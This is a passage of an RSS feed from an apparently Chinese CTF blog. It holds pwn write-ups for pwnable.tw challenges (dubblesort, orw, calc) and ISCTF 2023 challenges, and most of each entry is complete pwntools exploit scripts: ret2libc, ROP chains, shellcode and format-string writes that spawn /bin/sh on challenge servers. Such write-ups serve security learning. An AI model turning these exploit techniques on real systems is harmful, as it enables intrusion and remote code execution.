class="built_in">hex</span>(libc_base))</span><br><span class="line">    system =libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    length = <span class="number">24</span>+<span class="number">1</span>+<span class="number">9</span>+<span class="number">1</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;to sort :&#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;number : &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number : &#x27;</span>,<span class="string">b&#x27;+&#x27;</span>) <span class="comment"># &#x27;+&#x27;不会改变栈上的数据,可以用来绕过canary</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;number : &#x27;</span>,<span class="built_in">str</span>(system)) <span class="comment"># 将canary后到返回地址都填充为system避免因为排序导致顺序被打乱</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number : &#x27;</span>,<span class="built_in">str</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2024/01/25/pwnable-dubblesort/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwnable-orw</title>
      <link>http://example.com/2024/01/20/pwnable-orw/</link>
      <guid>http://example.com/2024/01/20/pwnable-orw/</guid>
      <pubDate>Sat, 20 Jan 2024 03:42:57 GMT</pubDate>
      
      <description>&lt;p&gt;orw入门题&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>orw入门题</p><span id="more"></span><p>解法一：</p><p>我直接用shellcraft生成的shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x0804A060</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/home/orw/flag&quot;</span>)+shellcraft.read(<span class="number">3</span>,addr,<span class="number">0x100</span>)+shellcraft.write(<span class="number">1</span>,addr,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,asm(shellcode))</span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>解法二：</p><p>手搓汇编代码，这里我是直接复制大佬写的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax,0x5    </span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">push ecx</span></span><br><span class="line"><span class="string">push 0x67616c66 </span></span><br><span class="line"><span class="string">push 0x2f2f2f77 </span></span><br><span class="line"><span class="string">push 0x726f2f65 </span></span><br><span class="line"><span class="string">push 0x6d6f682f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax,0x3     </span></span><br><span class="line"><span class="string">mov ecx, ebx</span></span><br><span class="line"><span class="string">mov ebx, 0x3</span></span><br><span class="line"><span class="string">mov edx, 0x50</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax,0x4     </span></span><br><span class="line"><span class="string">mov ebx,0x1</span></span><br><span class="line"><span class="string">mov edx,0x50</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;shellcode:&#x27;</span>, asm(shellcode))</span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2024/01/20/pwnable-orw/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwnable-calc</title>
      <link>http://example.com/2024/01/18/pwnable-calc/</link>
      <guid>http://example.com/2024/01/18/pwnable-calc/</guid>
      <pubDate>Thu, 18 Jan 2024 10:14:46 GMT</pubDate>
      
      <description>&lt;p&gt;对于一个尚未入门的菜鸟来说，这道题刷新了我对漏洞利用的理解，赶巧碰上感冒，花了好几天结合大佬的wp才理清逻辑，那么废话不多说，直接开始解题。。。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>对于一个尚未入门的菜鸟来说，这道题刷新了我对漏洞利用的理解，赶巧碰上感冒，花了好几天结合大佬的wp才理清逻辑，那么废话不多说，直接开始解题。。。</p><span id="more"></span><p>32位程序，没开PIE</p><p><img src="/../imgs/$%7Bfiilename%7D/pwnable-calc-1.png"></p><p>先来看主函数</p><p>ssignal和alarm没什么作用，只是限个时，fflush是清空缓冲区</p><p><img src="/../imgs/$%7Bfiilename%7D/pwnable-calc-2.png"></p><p>calc函数</p><p>bzero是置零，get_expr是获取不超过1024个字符，init_pool是初始化函数，等同于把v1数组置零</p><p><img src="/../imgs/$%7Bfiilename%7D/pwnable-calc-3.png"></p><p>重点是parse_expr函数，我在伪代码里面加上一些注释可以方便理解，由于变量比较多，我也是做了一些笔记避免我混淆，以下变量只讨论parse_expr函数，切记不可以和其他函数内的变量混淆</p><p>a2[0] 操作数个数<br>a2[a2[0]] 操作数<br>s1 临时变量，储存操作数<br>s 存储运算符(相当于栈)<br>s[v6] 相当于栈顶指针</p><p>函数的主逻辑是for循环，利用for循环检查每个字符，函数逻辑我均写为注释</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(*(<span class="type">char</span> *)(i + a1) - <span class="number">48</span>) &gt; <span class="number">9</span> ) <span class="comment">//检查字符是否为运算符。如果字符是运算符，如+、-这些，减48后会变成负数，由于是unsigned int类型，该负数会变成很大的正整数，自然会大于9</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = i + a1 - v4; <span class="comment">//统计长度，指数字的长度，如123的长度是3</span></span><br><span class="line">      s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v7 + <span class="number">1</span>);<span class="comment">//s1是临时变量，储存操作数</span></span><br><span class="line">      <span class="built_in">memcpy</span>(s1, v4, v7);</span><br><span class="line">      s1[v7] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;0&quot;</span>) )<span class="comment">//如果操作数是0，则报错</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = atoi(s1);<span class="comment">//将字符&quot;123&quot;转化为整数123</span></span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (*a2)++;</span><br><span class="line">        a2[v3 + <span class="number">1</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(i + a1) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(*(<span class="type">char</span> *)(i + <span class="number">1</span> + a1) - <span class="number">48</span>) &gt; <span class="number">9</span> )<span class="comment">//如果是连续的运算符，则报错</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v4 = i + <span class="number">1</span> + a1; <span class="comment">// 与前面的v7相对应，用于计算操作数长度</span></span><br><span class="line">      <span class="keyword">if</span> ( s[v6] ) <span class="comment">// s[V6]相当于栈顶指针</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(_BYTE *)(i + a1) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>: <span class="comment">// 如果字符为 &#x27;%&#x27;,&#x27;*&#x27;,&#x27;/&#x27; 则跳到 LABEL_14</span></span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( s[v6] != <span class="number">43</span> &amp;&amp; s[v6] != <span class="number">45</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            s[++v6] = *(_BYTE *)(i + a1); <span class="comment">// 如果字符为&#x27;+&#x27;,&#x27;-&#x27;则添加进s，相当于入栈</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">            eval(a2, s[v6]);<span class="comment">//计算函数，a2里有操作数，s[v6]是运算符</span></span><br><span class="line">            s[v6] = *(_BYTE *)(i + a1);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(a2, s[v6--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[v6] = *(_BYTE *)(i + a1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_BYTE *)(i + a1) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以利用的漏洞点是在eval中，检查错误中没有检查像’+123\n’这种表达式，因此在这里它是合法的，如果我们输入’+123\n‘，那么在程序遇到’\n’结束前变量储存的值是这样的<br>a2[0] &#x3D; 1</p><p>a2[a2[0]] &#x3D; a2[1] &#x3D; 123</p><p>s[0] &#x3D; ‘+’</p><p>那么在eval计算时，则会执行下图第一个框内的代码，使得a2[0] &#x3D; 1 + 123 &#x3D; 124</p><p>a2是什么？正是我们的操作数个数，那么我们成功改变了操作数的个数，那我们就可以利用这个点就可以实现任意地址读和任意地址写了</p><p><img src="/../imgs/$%7Bfiilename%7D/pwnable-calc-4.png"></p><p>直接上exp，注释中有说明为什么这么写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10100</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;=== Welcome to SECPROG calculator ===&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;+360&#x27;</span>) <span class="comment">#为什么是360？回到calc函数中的v1,我们的操作数个数正是储存在v1[0],而v1[361]是ebp，如何计算？因为每个int占4个字节，所以0x5a0/4 = 360，那我们要泄露v1[361]的内容为什么要是360，因为按前面发送+123那里的逻辑来看，原本v1[0] = 1,因为有360这1个操作数，所以发送+360后，就可以利用该漏洞将原本的 v1[0] = 1 改成 v1[0] = 1 + 360 = 361 了</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    old_ebp = <span class="built_in">int</span>(p.recvline())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;old_ebp:&quot;</span>,old_ebp)</span><br><span class="line"></span><br><span class="line">    gadget=[<span class="number">0x0805c34b</span>,<span class="number">0xb</span>,<span class="number">0x080701d0</span>,<span class="number">0</span>,<span class="number">0</span>,old_ebp,<span class="number">0x08049a21</span>,u32(<span class="string">&#x27;/bin&#x27;</span>),u32(<span class="string">&#x27;/sh\x00&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(gadget)): <span class="comment">#这个for循环是用于布置ROP，从v1[361]布置起，程序结束后执行rop</span></span><br><span class="line">        p.sendline(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(<span class="number">361</span>+i))</span><br><span class="line">        tmp=gadget[i]-<span class="built_in">int</span>(p.recvline())</span><br><span class="line">        <span class="keyword">if</span> tmp&gt;<span class="number">0</span>:</span><br><span class="line">            p.sendline(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(<span class="number">361</span>+i)+<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(tmp))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p.sendline(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(<span class="number">361</span>+i)+<span class="built_in">str</span>(tmp))</span><br><span class="line">        p.recvline()</span><br><span class="line"></span><br><span class="line">    p.sendline()</span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2024/01/18/pwnable-calc/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ISCTF 2023 wp pwn 部分题解</title>
      <link>http://example.com/2023/11/29/ISCTF-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</link>
      <guid>http://example.com/2023/11/29/ISCTF-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</guid>
      <pubDate>Wed, 29 Nov 2023 02:34:22 GMT</pubDate>
      
      <description>&lt;h3 id=&quot;ezpie&quot;&gt;&lt;a href=&quot;#ezpie&quot; class=&quot;headerlink&quot; title=&quot;ezpie&quot;&gt;&lt;/a&gt;ezpie&lt;/h3&gt;&lt;p&gt;func函数地址被放入栈中，用fmt漏洞读出地址，然后算真实地址，泄露puts，匹配这个版本libc6_2.31-0ubuntu9.10_amd64的libc&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h3 id="ezpie"><a href="#ezpie" class="headerlink" title="ezpie"></a>ezpie</h3><p>func函数地址被放入栈中，用fmt漏洞读出地址，然后算真实地址，泄露puts，匹配这个版本libc6_2.31-0ubuntu9.10_amd64的libc</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;43.249.195.138&quot;</span>,<span class="number">22453</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/ezpie&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">9</span>) + <span class="string">b&#x27;b&#x27;</span>) </span><br><span class="line">p.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">func_addr_t = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">info(<span class="string">&quot;func_addr:%#x&quot;</span>, func_addr_t)</span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">pop_rdi = <span class="number">0x1333</span></span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">func_addr = elf.sym.func</span><br><span class="line">ret_addr = <span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">pieBase = func_addr_t - func_addr</span><br><span class="line"></span><br><span class="line">pop_rdi_t =  pop_rdi + pieBase</span><br><span class="line">puts_got_t = puts_got + pieBase</span><br><span class="line">puts_plt_t = puts_plt + pieBase</span><br><span class="line">ret_addr_t = ret_addr + pieBase</span><br><span class="line"></span><br><span class="line">pad = offset + p64(pop_rdi_t) + p64(puts_got_t) + p64(puts_plt_t) + p64(func_addr_t)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;please enter your information-&gt; &quot;</span>,pad)</span><br><span class="line">puts_addr= u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&quot;puts_addr:%#x&quot;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">libc=  LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">libc_system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pad2 = offset + p64(ret_addr_t) + p64(pop_rdi_t) + p64(bin_sh_addr) + p64(libc_system)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;please enter your information-&gt; &quot;</span>,pad2)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>v1和v2地址被放进栈里面，调试发现其为第8和第9个参数，把他们的值改成18和52就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;43.249.195.138&quot;</span>,<span class="number">21001</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;%18c%8$hhn%34c%9$hhn&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>溢出字节为0x20，返回地址为第41个字节，利用for循环内的指针，输入28个字节后到达 i 的值，将 i 的值改成 0x27 ，也就是39，但s[39] 是第40个字节，循环后自动+1，所以下一个字节修改的是第41个字节，将第41和第42个字节替换为backdoor的地址，第43个字节一样就不用替换，然后就能返回backdoor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span 